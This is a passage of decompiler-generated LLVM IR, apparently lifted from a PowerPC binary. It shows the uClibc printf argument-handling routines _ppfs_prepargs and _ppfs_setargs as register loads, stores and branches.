  %v1_1000a470 = icmp slt i32 %v3_1000a46c, 0
  br i1 %v1_1000a470, label %dec_label_pc_1000a49c, label %dec_label_pc_1000a478

dec_label_pc_1000a478:                            ; preds = %dec_label_pc_1000a468
  %v0_1000a478 = load i32, i32* @r31, align 4
  %v1_1000a478 = inttoptr i32 %v0_1000a478 to i32*
  %v2_1000a478 = load i32, i32* %v1_1000a478, align 4
  br label %dec_label_pc_1000a484

dec_label_pc_1000a480:                            ; preds = %dec_label_pc_1000a454, %dec_label_pc_1000a458
  %v0_1000a480 = phi i32 [ %v0_1000a458, %dec_label_pc_1000a454 ], [ %v1_1000a458, %dec_label_pc_1000a458 ]
  %v1_1000a480 = add i32 %v0_1000a480, 1
  br label %dec_label_pc_1000a484

dec_label_pc_1000a484:                            ; preds = %dec_label_pc_1000a478, %dec_label_pc_1000a480, %dec_label_pc_1000a444
  %v0_1000a458 = phi i32 [ %v0_1000a444, %dec_label_pc_1000a444 ], [ %v1_1000a480, %dec_label_pc_1000a480 ], [ %v2_1000a478, %dec_label_pc_1000a478 ]
  store i32 %v0_1000a458, i32* %r9.global-to-local, align 4
  %v1_1000a484 = inttoptr i32 %v0_1000a458 to i8*
  %v2_1000a484 = load i8, i8* %v1_1000a484, align 1
  %v3_1000a484 = zext i8 %v2_1000a484 to i32
  store i32 %v3_1000a484, i32* %r0.global-to-local, align 4
  %v3_1000a488 = icmp eq i8 %v2_1000a484, 0
  br i1 %v3_1000a488, label %dec_label_pc_1000a494, label %dec_label_pc_1000a454

dec_label_pc_1000a494:                            ; preds = %dec_label_pc_1000a484
  %v0_1000a494 = load i32, i32* @r30, align 4
  %v1_1000a494 = load i32, i32* @r31, align 4
  %v2_1000a494 = inttoptr i32 %v1_1000a494 to i32*
  store i32 %v0_1000a494, i32* %v2_1000a494, align 4
  br label %dec_label_pc_1000a49c

dec_label_pc_1000a49c:                            ; preds = %dec_label_pc_1000a468, %dec_label_pc_1000a494
  %storemerge = phi i32 [ 0, %dec_label_pc_1000a494 ], [ -1, %dec_label_pc_1000a468 ]
  store i32 %v0_1000a3f8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000a484, { 1, 2, 0 }
  uselistorder i32 %v0_1000a458, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000a440, { 1, 0 }
  uselistorder i32 %v1_1000a43c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000a49c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a484, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a480, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000a4b0 = load i32, i32* @lr, align 4
  %v0_1000a4b8 = load i32, i32* @r3, align 4
  store i32 %v0_1000a4b8, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000a4d4 = add i32 %v0_1000a4b8, 24
  %v2_1000a4d4 = inttoptr i32 %v1_1000a4d4 to i32*
  %v3_1000a4d4 = load i32, i32* %v2_1000a4d4, align 4
  store i32 %v3_1000a4d4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000a4d4, 1
  br i1 %tmp4, label %dec_label_pc_1000a4f8, label %dec_label_pc_1000a4e0

dec_label_pc_1000a4e0:                            ; preds = %entry
  %v2_1000a4e0 = add i32 %v0_1000a4b8, 8
  %v3_1000a4e0 = inttoptr i32 %v2_1000a4e0 to i32*
  store i32 0, i32* %v3_1000a4e0, align 4
  %v0_1000a4e4 = load i32, i32* @r30, align 4
  %v1_1000a4e4 = load i32, i32* @r3, align 4
  %v2_1000a4e4 = add i32 %v1_1000a4e4, 28
  %v3_1000a4e4 = inttoptr i32 %v2_1000a4e4 to i32*
  store i32 %v0_1000a4e4, i32* %v3_1000a4e4, align 4
  %v0_1000a4e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a4e8 = load i32, i32* @r3, align 4
  %v2_1000a4e8 = add i32 %v1_1000a4e8, 24
  %v3_1000a4e8 = inttoptr i32 %v2_1000a4e8 to i32*
  store i32 %v0_1000a4e8, i32* %v3_1000a4e8, align 4
  %v0_1000a4ec = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a4ec = load i32, i32* @r3, align 4
  %v2_1000a4ec = add i32 %v1_1000a4ec, 4
  %v3_1000a4ec = inttoptr i32 %v2_1000a4ec to i32*
  store i32 %v0_1000a4ec, i32* %v3_1000a4ec, align 4
  store i32 268477684, i32* @lr, align 4
  %v0_1000a4f0 = call i32 @_ppfs_setargs()
  store i32 %v0_1000a4f0, i32* %r3.global-to-local, align 4
  %v0_1000a4f4 = load i32, i32* @r30, align 4
  %v1_1000a4f4 = load i32, i32* @r31, align 4
  %v2_1000a4f4 = add i32 %v1_1000a4f4, 24
  %v3_1000a4f4 = inttoptr i32 %v2_1000a4f4 to i32*
  store i32 %v0_1000a4f4, i32* %v3_1000a4f4, align 4
  %v0_1000a508.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a4f8

dec_label_pc_1000a4f8:                            ; preds = %entry, %dec_label_pc_1000a4e0
  %v0_1000a508 = phi i32 [ %v0_1000a4b8, %entry ], [ %v0_1000a508.pre, %dec_label_pc_1000a4e0 ]
  store i32 %v0_1000a4b0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a508

; uselistorder directives
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_1000a4f8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000a50c = load i32, i32* @r3, align 4
  %v1_1000a50c = add i32 %v0_1000a50c, 24
  %v2_1000a50c = inttoptr i32 %v1_1000a50c to i32*
  %v3_1000a50c = load i32, i32* %v2_1000a50c, align 4
  store i32 %v3_1000a50c, i32* %r0.global-to-local, align 4
  %v1_1000a510 = add i32 %v0_1000a50c, 88
  store i32 %v1_1000a510, i32* @r8, align 4
  %v1_1000a514 = add i32 %v0_1000a50c, 8
  %v2_1000a514 = inttoptr i32 %v1_1000a514 to i32*
  %v3_1000a514 = load i32, i32* %v2_1000a514, align 4
  store i32 %v3_1000a514, i32* %r9.global-to-local, align 4
  %v2_1000a518 = icmp sgt i32 %v3_1000a50c, 0
  %v3_1000a518 = icmp eq i32 %v3_1000a50c, 0
  store i1 %v2_1000a518, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000a518, label %dec_label_pc_1000a520, label %dec_label_pc_1000a70c

dec_label_pc_1000a520:                            ; preds = %entry
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000a524 = icmp ne i32 %v3_1000a514, -2147483648
  %v4_1000a524 = icmp eq i32 %v3_1000a514, -2147483648
  store i1 %v3_1000a524, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000a524, label %dec_label_pc_1000a52c, label %dec_label_pc_1000a56c

dec_label_pc_1000a52c:                            ; preds = %dec_label_pc_1000a520
  %v1_1000a52c = add i32 %v0_1000a50c, 76
  %v2_1000a52c = inttoptr i32 %v1_1000a52c to i8*
  %v3_1000a52c = load i8, i8* %v2_1000a52c, align 1
  %v4_1000a52c = zext i8 %v3_1000a52c to i32
  store i32 %v4_1000a52c, i32* @r10, align 4
  store i32 %v1_1000a52c, i32* %r11.global-to-local, align 4
  %v2_1000a534 = icmp ugt i8 %v3_1000a52c, 8
  store i1 %v2_1000a534, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000a52c, 7
  br i1 %tmp, label %dec_label_pc_1000a554, label %dec_label_pc_1000a53c

dec_label_pc_1000a53c:                            ; preds = %dec_label_pc_1000a52c
  %v1_1000a53c = add i32 %v0_1000a50c, 84
  %v2_1000a53c = inttoptr i32 %v1_1000a53c to i32*
  %v3_1000a53c = load i32, i32* %v2_1000a53c, align 4
  %v1_1000a540 = mul nuw nsw i32 %v4_1000a52c, 4
  %v2_1000a544 = add i32 %v3_1000a53c, %v1_1000a540
  store i32 %v2_1000a544, i32* %r9.global-to-local, align 4
  %v1_1000a548 = add nuw nsw i32 %v4_1000a52c, 1
  store i32 %v1_1000a548, i32* %r0.global-to-local, align 4
  %v1_1000a54c = trunc i32 %v1_1000a548 to i8
  store i8 %v1_1000a54c, i8* %v2_1000a52c, align 1
  br label %dec_label_pc_1000a560

dec_label_pc_1000a554:                            ; preds = %dec_label_pc_1000a52c
  %v1_1000a554 = add i32 %v0_1000a50c, 80
  %v2_1000a554 = inttoptr i32 %v1_1000a554 to i32*
  %v3_1000a554 = load i32, i32* %v2_1000a554, align 4
  store i32 %v3_1000a554, i32* %r9.global-to-local, align 4
  %v1_1000a558 = add i32 %v3_1000a554, 4
  store i32 %v1_1000a558, i32* %r0.global-to-local, align 4
  store i32 %v1_1000a558, i32* %v2_1000a554, align 4
  br label %dec_label_pc_1000a560

dec_label_pc_1000a560:                            ; preds = %dec_label_pc_1000a53c, %dec_label_pc_1000a554
  %v0_1000a560 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a560 = inttoptr i32 %v0_1000a560 to i32*
  %v2_1000a560 = load i32, i32* %v1_1000a560, align 4
  store i32 %v2_1000a560, i32* %r0.global-to-local, align 4
  %v1_1000a564 = load i32, i32* @r8, align 4
  %v2_1000a564 = inttoptr i32 %v1_1000a564 to i32*
  store i32 %v2_1000a560, i32* %v2_1000a564, align 4
  %v0_1000a568 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a568 = load i32, i32* @r3, align 4
  %v2_1000a568 = add i32 %v1_1000a568, 8
  %v3_1000a568 = inttoptr i32 %v2_1000a568 to i32*
  store i32 %v0_1000a568, i32* %v3_1000a568, align 4
  %v0_1000a56c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000a56c

dec_label_pc_1000a56c:                            ; preds = %dec_label_pc_1000a520, %dec_label_pc_1000a560
  %v2_1000a59c = phi i32 [ %v0_1000a50c, %dec_label_pc_1000a520 ], [ %v0_1000a56c.pre, %dec_label_pc_1000a560 ]
  %v1_1000a56c = add i32 %v2_1000a59c, 4
  %v2_1000a56c = inttoptr i32 %v1_1000a56c to i32*
  %v3_1000a56c = load i32, i32* %v2_1000a56c, align 4
  store i32 %v3_1000a56c, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000a574 = icmp ne i32 %v3_1000a56c, -2147483648
  %v4_1000a574 = icmp eq i32 %v3_1000a56c, -2147483648
  store i1 %v3_1000a574, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000a574, label %dec_label_pc_1000a57c, label %dec_label_pc_1000a6fc.preheader

dec_label_pc_1000a57c:                            ; preds = %dec_label_pc_1000a56c
  %v1_1000a57c = add i32 %v2_1000a59c, 76
  %v2_1000a57c = inttoptr i32 %v1_1000a57c to i8*
  %v3_1000a57c = load i8, i8* %v2_1000a57c, align 1
  %v4_1000a57c = zext i8 %v3_1000a57c to i32
  store i32 %v4_1000a57c, i32* @r10, align 4
  store i32 %v1_1000a57c, i32* %r11.global-to-local, align 4
  %v2_1000a584 = icmp ugt i8 %v3_1000a57c, 8
  store i1 %v2_1000a584, i1* %cr7_gt.global-to-local, align 1
  %tmp22 = icmp ugt i8 %v3_1000a57c, 7
  br i1 %tmp22, label %dec_label_pc_1000a5a4, label %dec_label_pc_1000a58c

dec_label_pc_1000a58c:                            ; preds = %dec_label_pc_1000a57c
  %v1_1000a58c = add i32 %v2_1000a59c, 84
  %v2_1000a58c = inttoptr i32 %v1_1000a58c to i32*
  %v3_1000a58c = load i32, i32* %v2_1000a58c, align 4
  %v1_1000a590 = mul nuw nsw i32 %v4_1000a57c, 4
  %v2_1000a594 = add i32 %v3_1000a58c, %v1_1000a590
  store i32 %v2_1000a594, i32* %r9.global-to-local, align 4
  %v1_1000a598 = add nuw nsw i32 %v4_1000a57c, 1
  store i32 %v1_1000a598, i32* %r0.global-to-local, align 4
  %v1_1000a59c = trunc i32 %v1_1000a598 to i8
  store i8 %v1_1000a59c, i8* %v2_1000a57c, align 1
  br label %dec_label_pc_1000a5b0

dec_label_pc_1000a5a4:                            ; preds = %dec_label_pc_1000a57c
  %v1_1000a5a4 = add i32 %v2_1000a59c, 80
  %v2_1000a5a4 = inttoptr i32 %v1_1000a5a4 to i32*
  %v3_1000a5a4 = load i32, i32* %v2_1000a5a4, align 4
  store i32 %v3_1000a5a4, i32* %r9.global-to-local, align 4
  %v1_1000a5a8 = add i32 %v3_1000a5a4, 4
  store i32 %v1_1000a5a8, i32* %r0.global-to-local, align 4
  store i32 %v1_1000a5a8, i32* %v2_1000a5a4, align 4
  br label %dec_label_pc_1000a5b0

dec_label_pc_1000a5b0:                            ; preds = %dec_label_pc_1000a58c, %dec_label_pc_1000a5a4
  %v0_1000a5b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a5b0 = inttoptr i32 %v0_1000a5b0 to i32*
  %v2_1000a5b0 = load i32, i32* %v1_1000a5b0, align 4
  store i32 %v2_1000a5b0, i32* %r0.global-to-local, align 4
  %v1_1000a5b4 = load i32, i32* @r8, align 4
  %v2_1000a5b4 = inttoptr i32 %v1_1000a5b4 to i32*
  store i32 %v2_1000a5b0, i32* %v2_1000a5b4, align 4
  %v0_1000a5b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a5b8 = load i32, i32* @r3, align 4
  %v2_1000a5b8 = add i32 %v1_1000a5b8, 4
  %v3_1000a5b8 = inttoptr i32 %v2_1000a5b8 to i32*
  store i32 %v0_1000a5b8, i32* %v3_1000a5b8, align 4
  %v0_1000a6fc5.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000a6fc.preheader

dec_label_pc_1000a6fc.preheader:                  ; preds = %dec_label_pc_1000a56c, %dec_label_pc_1000a5b0
  %v0_1000a6fc5 = phi i32 [ %v2_1000a59c, %dec_label_pc_1000a56c ], [ %v0_1000a6fc5.pre, %dec_label_pc_1000a5b0 ]
  store i32 0, i32* @r7, align 4
  %v1_1000a6fc6 = add i32 %v0_1000a6fc5, 28
  %v2_1000a6fc7 = inttoptr i32 %v1_1000a6fc6 to i32*
  %v3_1000a6fc8 = load i32, i32* %v2_1000a6fc7, align 4
  store i32 %v3_1000a6fc8, i32* %r0.global-to-local, align 4
  %v2_1000a7009 = icmp sgt i32 %v3_1000a6fc8, 0
  %v3_1000a70010 = icmp slt i32 %v3_1000a6fc8, 0
  store i1 %v3_1000a70010, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000a7009, label %dec_label_pc_1000a5c4, label %dec_label_pc_1000a74c

dec_label_pc_1000a5c4:                            ; preds = %dec_label_pc_1000a6fc.preheader, %dec_label_pc_1000a6f8
  %v2_1000a6d8 = phi i32 [ %v0_1000a6fc, %dec_label_pc_1000a6f8 ], [ %v0_1000a6fc5, %dec_label_pc_1000a6fc.preheader ]
  %v0_1000a5c4 = phi i32 [ %v1_1000a6f8, %dec_label_pc_1000a6f8 ], [ 0, %dec_label_pc_1000a6fc.preheader ]
  %v1_1000a5c4 = mul i32 %v0_1000a5c4, 4
  %v2_1000a5c8 = add i32 %v1_1000a5c4, %v2_1000a6d8
  store i32 %v2_1000a5c8, i32* %r9.global-to-local, align 4
  %v1_1000a5cc = add i32 %v2_1000a5c8, 40
  %v2_1000a5cc = inttoptr i32 %v1_1000a5cc to i32*
  %v3_1000a5cc = load i32, i32* %v2_1000a5cc, align 4
  store i32 %v3_1000a5cc, i32* %r0.global-to-local, align 4
  %v2_1000a5d0 = icmp sgt i32 %v3_1000a5cc, 8
  %v3_1000a5d0 = icmp eq i32 %v3_1000a5cc, 8
  store i1 %v2_1000a5d0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000a5d0, label %dec_label_pc_1000a6f8, label %dec_label_pc_1000a5d8

dec_label_pc_1000a5d8:                            ; preds = %dec_label_pc_1000a5c4
  %v1_1000a5d8 = add i32 %v2_1000a6d8, 76
  store i32 %v1_1000a5d8, i32* @r10, align 4
  br i1 %v2_1000a5d0, label %dec_label_pc_1000a5f4, label %dec_label_pc_1000a5e0

dec_label_pc_1000a5e0:                            ; preds = %dec_label_pc_1000a5d8
  %v2_1000a5e0 = icmp sgt i32 %v3_1000a5cc, 2
  store i1 %v2_1000a5e0, i1* %cr7_gt.global-to-local, align 1
  %tmp23 = icmp slt i32 %v3_1000a5cc, 3
  br i1 %tmp23, label %dec_label_pc_1000a6bc, label %dec_label_pc_1000a60c

dec_label_pc_1000a5f4:                            ; preds = %dec_label_pc_1000a5d8
  %v2_1000a5f4 = icmp sgt i32 %v3_1000a5cc, 1024
  store i1 %v2_1000a5f4, i1* %cr7_gt.global-to-local, align 1
  %tmp24 = icmp slt i32 %v3_1000a5cc, 1025
  br i1 %tmp24, label %dec_label_pc_1000a6bc, label %dec_label_pc_1000a600

dec_label_pc_1000a600:                            ; preds = %dec_label_pc_1000a5f4
  %v2_1000a600 = icmp sgt i32 %v3_1000a5cc, 2048
  %v3_1000a600 = icmp eq i32 %v3_1000a5cc, 2048
  store i1 %v2_1000a600, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000a600, label %dec_label_pc_1000a614, label %dec_label_pc_1000a608

dec_label_pc_1000a608:                            ; preds = %dec_label_pc_1000a600
  %v2_1000a608 = icmp sgt i32 %v3_1000a5cc, 2055
  %v3_1000a608 = icmp eq i32 %v3_1000a5cc, 2055
  store i1 %v2_1000a608, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000a608, label %dec_label_pc_1000a670, label %dec_label_pc_1000a6bc

dec_label_pc_1000a60c:                            ; preds = %dec_label_pc_1000a5e0
  %v3_1000a5ec = icmp eq i32 %v3_1000a5cc, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000a5ec, label %dec_label_pc_1000a670, label %dec_label_pc_1000a6bc

dec_label_pc_1000a614:                            ; preds = %dec_label_pc_1000a600
  %v2_1000a614 = inttoptr i32 %v1_1000a5d8 to i8*
  %v3_1000a614 = load i8, i8* %v2_1000a614, align 1
  %v4_1000a614 = zext i8 %v3_1000a614 to i32
  %v2_1000a618 = icmp ugt i8 %v3_1000a614, 6
  store i1 %v2_1000a618, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1000a614, 2
  %v1_1000a61c = zext i8 %tmp28 to i32
  store i32 %v1_1000a61c, i32* %r9.global-to-local, align 4
  %v2_1000a620 = add nuw nsw i32 %v1_1000a61c, %v4_1000a614
  store i32 %v2_1000a620, i32* %r0.global-to-local, align 4
  %v1_1000a624 = trunc i32 %v2_1000a620 to i8
  store i8 %v1_1000a624, i8* %v2_1000a614, align 1
  %v0_1000a628 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1000a628, label %dec_label_pc_1000a648, label %dec_label_pc_1000a62c

dec_label_pc_1000a62c:                            ; preds = %dec_label_pc_1000a614
  %v0_1000a62c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a62c = urem i32 %v0_1000a62c, 256
  store i32 %v1_1000a62c, i32* %r9.global-to-local, align 4
  %v0_1000a630 = load i32, i32* @r10, align 4
  %v1_1000a630 = add i32 %v0_1000a630, 8
  %v2_1000a630 = inttoptr i32 %v1_1000a630 to i32*
  %v3_1000a630 = load i32, i32* %v2_1000a630, align 4
  %v1_1000a634 = mul nuw nsw i32 %v1_1000a62c, 4
  store i32 %v1_1000a634, i32* %r0.global-to-local, align 4
  %v1_1000a638 = add nuw nsw i32 %v1_1000a62c, 2
  store i32 %v1_1000a638, i32* %r9.global-to-local, align 4
  %v2_1000a63c = add i32 %v3_1000a630, %v1_1000a634
  store i32 %v2_1000a63c, i32* %r11.global-to-local, align 4
  %v1_1000a640 = trunc i32 %v1_1000a638 to i8
  %v2_1000a640 = load i32, i32* @r3, align 4
  %v3_1000a640 = add i32 %v2_1000a640, 76
  %v4_1000a640 = inttoptr i32 %v3_1000a640 to i8*
  store i8 %v1_1000a640, i8* %v4_1000a640, align 1
  br label %dec_label_pc_1000a65c

dec_label_pc_1000a648:                            ; preds = %dec_label_pc_1000a614
  %v0_1000a648 = load i32, i32* @r10, align 4
  %v1_1000a648 = add i32 %v0_1000a648, 4
  %v2_1000a648 = inttoptr i32 %v1_1000a648 to i32*
  %v3_1000a648 = load i32, i32* %v2_1000a648, align 4
  %v1_1000a64c = add i32 %v3_1000a648, 7
  store i32 %v1_1000a64c, i32* %r9.global-to-local, align 4
  %v1_1000a650 = call i32 @__asm_rlwinm(i32 %v1_1000a64c, i32 0, i32 0, i32 28)
  store i32 %v1_1000a650, i32* %r11.global-to-local, align 4
  %v1_1000a654 = add i32 %v1_1000a650, 8
  store i32 %v1_1000a654, i32* %r0.global-to-local, align 4
  %v1_1000a658 = load i32, i32* @r10, align 4
  %v2_1000a658 = add i32 %v1_1000a658, 4
  %v3_1000a658 = inttoptr i32 %v2_1000a658 to i32*
  store i32 %v1_1000a654, i32* %v3_1000a658, align 4
  br label %dec_label_pc_1000a65c

dec_label_pc_1000a65c:                            ; preds = %dec_label_pc_1000a62c, %dec_label_pc_1000a648
  %v0_1000a65c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a65c = inttoptr i32 %v0_1000a65c to i32*
  %v2_1000a65c = load i32, i32* %v1_1000a65c, align 4
  store i32 %v2_1000a65c, i32* %r9.global-to-local, align 4
  %v1_1000a660 = add i32 %v0_1000a65c, 4
  %v2_1000a660 = inttoptr i32 %v1_1000a660 to i32*
  %v3_1000a660 = load i32, i32* %v2_1000a660, align 4
  store i32 %v3_1000a660, i32* @r10, align 4
  %v1_1000a664 = load i32, i32* @r8, align 4
  %v2_1000a664 = inttoptr i32 %v1_1000a664 to i32*
  store i32 %v2_1000a65c, i32* %v2_1000a664, align 4
  %v0_1000a668 = load i32, i32* @r10, align 4
  %v1_1000a668 = load i32, i32* @r8, align 4
  %v2_1000a668 = add i32 %v1_1000a668, 4
  %v3_1000a668 = inttoptr i32 %v2_1000a668 to i32*
  store i32 %v0_1000a668, i32* %v3_1000a668, align 4
  br label %dec_label_pc_1000a6f4

dec_label_pc_1000a670:                            ; preds = %dec_label_pc_1000a608, %dec_label_pc_1000a60c
  store i32 %v1_1000a5d8, i32* @r10, align 4
  %v1_1000a674 = add i32 %v2_1000a6d8, 77
  %v2_1000a674 = inttoptr i32 %v1_1000a674 to i8*
  %v3_1000a674 = load i8, i8* %v2_1000a674, align 1
  %v4_1000a674 = zext i8 %v3_1000a674 to i32
  store i32 %v4_1000a674, i32* %r11.global-to-local, align 4
  %v2_1000a678 = icmp ugt i8 %v3_1000a674, 8
  store i1 %v2_1000a678, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1000a674, 7
  br i1 %tmp25, label %dec_label_pc_1000a69c, label %dec_label_pc_1000a680

dec_label_pc_1000a680:                            ; preds = %dec_label_pc_1000a670
  %v1_1000a680 = add i32 %v2_1000a6d8, 84
  %v2_1000a680 = inttoptr i32 %v1_1000a680 to i32*
  %v3_1000a680 = load i32, i32* %v2_1000a680, align 4
  %v1_1000a684 = mul nuw nsw i32 %v4_1000a674, 8
  %v1_1000a688 = add nuw nsw i32 %v1_1000a684, 32
  %v2_1000a68c = add i32 %v1_1000a688, %v3_1000a680
  store i32 %v2_1000a68c, i32* %r9.global-to-local, align 4
  %v1_1000a690 = add nuw nsw i32 %v4_1000a674, 1
  store i32 %v1_1000a690, i32* %r0.global-to-local, align 4
  %v1_1000a694 = trunc i32 %v1_1000a690 to i8
  store i8 %v1_1000a694, i8* %v2_1000a674, align 1
  br label %dec_label_pc_1000a6f4

dec_label_pc_1000a69c:                            ; preds = %dec_label_pc_1000a670
  %v1_1000a69c = add i32 %v2_1000a6d8, 80
  %v2_1000a69c = inttoptr i32 %v1_1000a69c to i32*
  %v3_1000a69c = load i32, i32* %v2_1000a69c, align 4
  %v1_1000a6a0 = add i32 %v3_1000a69c, 7
  store i32 %v1_1000a6a0, i32* %r9.global-to-local, align 4
  %v1_1000a6a4 = call i32 @__asm_rlwinm(i32 %v1_1000a6a0, i32 0, i32 0, i32 28)
  store i32 %v1_1000a6a4, i32* %r9.global-to-local, align 4
  %v1_1000a6a8 = add i32 %v1_1000a6a4, 8
  store i32 %v1_1000a6a8, i32* %r0.global-to-local, align 4
  %v1_1000a6ac = load i32, i32* @r10, align 4
  %v2_1000a6ac = add i32 %v1_1000a6ac, 4
  %v3_1000a6ac = inttoptr i32 %v2_1000a6ac to i32*
  store i32 %v1_1000a6a8, i32* %v3_1000a6ac, align 4
  br label %dec_label_pc_1000a6f4

dec_label_pc_1000a6bc:                            ; preds = %dec_label_pc_1000a608, %dec_label_pc_1000a60c, %dec_label_pc_1000a5f4, %dec_label_pc_1000a5e0
  %v2_1000a6bc = inttoptr i32 %v1_1000a5d8 to i8*
  %v3_1000a6bc = load i8, i8* %v2_1000a6bc, align 1
  %v4_1000a6bc = zext i8 %v3_1000a6bc to i32
  store i32 %v4_1000a6bc, i32* %r11.global-to-local, align 4
  %v2_1000a6c0 = icmp ugt i8 %v3_1000a6bc, 8
  store i1 %v2_1000a6c0, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000a6bc, 7
  br i1 %tmp26, label %dec_label_pc_1000a6e0, label %dec_label_pc_1000a6c8

dec_label_pc_1000a6c8:                            ; preds = %dec_label_pc_1000a6bc
  %v1_1000a6c8 = add i32 %v2_1000a6d8, 84
  %v2_1000a6c8 = inttoptr i32 %v1_1000a6c8 to i32*
  %v3_1000a6c8 = load i32, i32* %v2_1000a6c8, align 4
  %v1_1000a6cc = mul nuw nsw i32 %v4_1000a6bc, 4
  %v2_1000a6d0 = add i32 %v3_1000a6c8, %v1_1000a6cc
  store i32 %v2_1000a6d0, i32* %r9.global-to-local, align 4
  %v1_1000a6d4 = add nuw nsw i32 %v4_1000a6bc, 1
  store i32 %v1_1000a6d4, i32* %r0.global-to-local, align 4
  %v1_1000a6d8 = trunc i32 %v1_1000a6d4 to i8
  store i8 %v1_1000a6d8, i8* %v2_1000a6bc, align 1
  br label %dec_label_pc_1000a6ec

dec_label_pc_1000a6e0:                            ; preds = %dec_label_pc_1000a6bc
  %v1_1000a6e0 = add i32 %v2_1000a6d8, 80
  %v2_1000a6e0 = inttoptr i32 %v1_1000a6e0 to i32*
  %v3_1000a6e0 = load i32, i32* %v2_1000a6e0, align 4
  store i32 %v3_1000a6e0, i32* %r9.global-to-local, align 4
  %v1_1000a6e4 = add i32 %v3_1000a6e0, 4
  store i32 %v1_1000a6e4, i32* %r0.global-to-local, align 4
  store i32 %v1_1000a6e4, i32* %v2_1000a6e0, align 4
  br label %dec_label_pc_1000a6ec

dec_label_pc_1000a6ec:                            ; preds = %dec_label_pc_1000a6c8, %dec_label_pc_1000a6e0
  %v0_1000a6ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a6ec = inttoptr i32 %v0_1000a6ec to i32*
  %v2_1000a6ec = load i32, i32* %v1_1000a6ec, align 4
  store i32 %v2_1000a6ec, i32* %r0.global-to-local, align 4
  %v1_1000a6f0 = load i32, i32* @r8, align 4
  %v2_1000a6f0 = inttoptr i32 %v1_1000a6f0 to i32*
  store i32 %v2_1000a6ec, i32* %v2_1000a6f0, align 4
  br label %dec_label_pc_1000a6f4

dec_label_pc_1000a6f4:                            ; preds = %dec_label_pc_1000a69c, %dec_label_pc_1000a680, %dec_label_pc_1000a65c, %dec_label_pc_1000a6ec
  %v0_1000a6f4 = load i32, i32* @r8, align 4
  %v1_1000a6f4 = add i32 %v0_1000a6f4, 8
  store i32 %v1_1000a6f4, i32* @r8, align 4
  %v0_1000a6f8.pre = load i32, i32* @r7, align 4
  %v0_1000a6fc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000a6f8

dec_label_pc_1000a6f8:                            ; preds = %dec_label_pc_1000a5c4, %dec_label_pc_1000a6f4
  %v0_1000a6fc = phi i32 [ %v2_1000a6d8, %dec_label_pc_1000a5c4 ], [ %v0_1000a6fc.pre, %dec_label_pc_1000a6f4 ]
  %v0_1000a6f8 = phi i32 [ %v0_1000a5c4, %dec_label_pc_1000a5c4 ], [ %v0_1000a6f8.pre, %dec_label_pc_1000a6f4 ]
  %v1_1000a6f8 = add i32 %v0_1000a6f8, 1
  store i32 %v1_1000a6f8, i32* @r7, align 4
  %v1_1000a6fc = add i32 %v0_1000a6fc, 28
  %v2_1000a6fc = inttoptr i32 %v1_1000a6fc to i32*
  %v3_1000a6fc = load i32, i32* %v2_1000a6fc, align 4
  store i32 %v3_1000a6fc, i32* %r0.global-to-local, align 4
  %v2_1000a700 = icmp slt i32 %v1_1000a6f8, %v3_1000a6fc
  %v3_1000a700 = icmp sgt i32 %v1_1000a6f8, %v3_1000a6fc
  store i1 %v3_1000a700, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000a700, label %dec_label_pc_1000a5c4, label %dec_label_pc_1000a74c

dec_label_pc_1000a70c:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1000a710 = icmp ne i32 %v3_1000a514, -2147483648
  %v4_1000a710 = icmp eq i32 %v3_1000a514, -2147483648
  store i1 %v3_1000a710, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000a710, label %dec_label_pc_1000a718, label %dec_label_pc_1000a72c

